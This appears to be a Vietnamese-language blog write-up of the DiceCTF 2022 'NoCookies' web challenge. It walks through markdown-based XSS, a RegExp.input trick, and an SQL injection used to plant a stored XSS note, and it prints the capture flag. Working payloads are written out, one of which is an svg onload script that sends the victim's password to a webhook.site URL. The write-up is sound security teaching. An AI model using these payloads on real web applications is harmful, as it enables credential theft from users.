---
title: NoCookies - DiceCTF2022
description: From DiceCTF2022
author: to^
date: 2022-04-08 13:07:00 +0700
categories: [WecSec, CTF, DiceCTF2022]
tags: [sqli, xss]     # TAG names should always be lowercase
img_path: /assets/img/
image:
 src: no_cookies/dicectf_logo.jpg
 alt: DiceCTF logo
 width: 1000
 height: 400
---
## _Link challenge_
<https://instancer.mc.ax/no-cookies>

<https://admin-bot.mc.ax/no-cookies>

## _Source code_
[Download](https://github.com/to016/to016.github.io/raw/main/assets/img/no_cookies/no-cookies.zip)

## _Sơ lược về trang web_
![overview](no_cookies/overview.png)
_overview_

- Sẽ có 2 chức năng: Register -> đăng kí account và create note -> tạo note
- Hoạt động không dựa trên cookie mà yêu cầu ta nhập lại username, password mỗi lần thực hiện một hành động nào đó.

Ở phần Create Note thì ta có 2 tùy chọn là Markdown hoặc là Plain.
![Create note](no_cookies/md_pl.png)
_create note option_

## _Phân tích_
### 1. XSS qua markdown option
Đọc qua source code thì thấy phần lớn các trang view.html, register.html đều thuộc dạng client side rendering
![markdown note handler](no_cookies/md_handler.png)
_markdown note hander_

Điều đáng chú ý ở đoạn code này là nếu note nhập vào có dạng `[blabla](test)` thì sẽ return thẻ a: 
`<a href = "test">blabla</a>`
Từ đây có thể dễ dàng khai thác XSS: ta dùng 2 thuộc tính autofocus và onfocus để trigger nó
```
<a href ="test" autofocus onfocus= "alert`1">
```
Điều đáng buồn là khi tạo note:
`(foo)[http://example.com" autofocus=autofocus onfocus="alert(password&#x29;]`
(ở đây escape `)` trở thành `&#x29;` để cho regex không làm mất đi `)` )
Gửi note và ấn view xuất hiện pop-up `undefined` 😟

Quay lại source code thấy rằng `const password`, được định nghĩa trong một anonymous arrow function và đoạn code được thực thi bên ngoài nó (đến từ HTML event handler)

Nhìn lại source, để ý cách validate password:
```js
const validate = (text) => {
return /^[^$']+$/.test(text ?? '');
}
```
Chỉ đơn giản là kiểm tra sao cho phải có tối thiểu 1 kí tự và không tồn tại `'` hoặc `$`
Mình tìm được một thứ thú vụ về [Regex](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input). Đại khái là: `RegExp.input` hoặc `RegExp.$_` sẽ trả về chuỗi match với regular expression.

Ví dụ:
```js
var re = /hi/g;
re.test('hi there!');
RegExp.input; // "hi there!"
re.test('foo'); // new test, non-matching
RegExp.$_; // "hi there!"
re.test('hi world!'); // new test, matching
RegExp.$_; // "hi world!"
```

Nhưng tất cả những `.replace()` call từ markdown parsing đã làm thay đổi giá trị của nó (overiding the password) vì vậy không thể khai thác thông qua markdown note -> chỉ còn lại con đường plain note.
### 2. XSS qua plain option
![database handler code1](no_cookies/db_handler1.png)
_database handler code1_

![database handler code2](no_cookies/db_handler2.png)
_database handler code2_

Ta có thể thấy trước khi chèn vào DB, note bị replace `<` và `>` gây khó khăn cho việc khai thác.

Nhưng `prepare function` đã giải quyết vấn đề này, hàm này đơn giản chỉ là replace **lần lượt** `:id, :username, :note, :mode` thành các giá trị tương ứng với nó.
```
{
id: "12345",
username: ":note",
note: ', :mode, 22, 0)-- ',
mode: '<img src=x onerror="alert(RegExp.input)">',
}
```

![sqli poc](no_cookies/sqli.png)
_sqli poc_

## _Khai thác_
![reponse](no_cookies/response.png)
_response_

![result](no_cookies/result.png)
_result_



## _Overwrite "document.querySelector" và "JSON.stringify"_
ở phần này mình sẽ đề cập tới một cách khai thác khác.

Cách này thì vẫn vận dụng sqli như cách trước để chèn xss note vào db nhưng khác ở chỗ xss note sẽ là:
```html
<svg><svg/onload="document.querySelector=function(){JSON.stringify=a=>fetch(`https://webhook.site/1e6c4248-b312-498b-93c3-073ffc762693?`+a.password),arguments.callee.caller()}">
```
Code này thực hiện việc rewrite lại hàm `document.querySelector` và `JSON.stringify`, sau đó gọi `arguments.callee.caller()`

![Exploit](no_cookies/exp.png)

- Line 59 thực hiện gán `innerHTML = Plain note` của ta đồng thời kích hoạt `onload` event của `svg` thực hiện việc ghi đè hàm `document.querySelector`.
- Line 60 gọi tới `document.querySelector` (lúc này là hàm mà ta đã định nghĩa lại): thực hiện ghi đè hàm 
`JSON.stringify` và đồng thời gọi tới `arguments.callee.caller()`.
- Có thể hiểu arguments.callee là chỉ hàm hiện tại đang thực thi -> `document.querySelector` và `arguments.callee.caller()` là hàm gọi tới nó, chính là cái `async ()` bao trọn tất cả code. Hay nói cách khác mục đích của `arguments.callee.caller()` là để chạy lại đoạn code từ 24 – 62 một lần nữa. Lúc này `JSON.stringify` nhận vào một object bao gồm password sẽ thực hiện fetch tới web hook của ta và boom flag!

> dice{curr3nt_st4t3_0f_j4v45cr1pt}
{: .prompt-info  }

## _Tham khảo_
<https://blog.bawolff.net/2022/02/write-up-for-dicectf-2022-nocookies.html>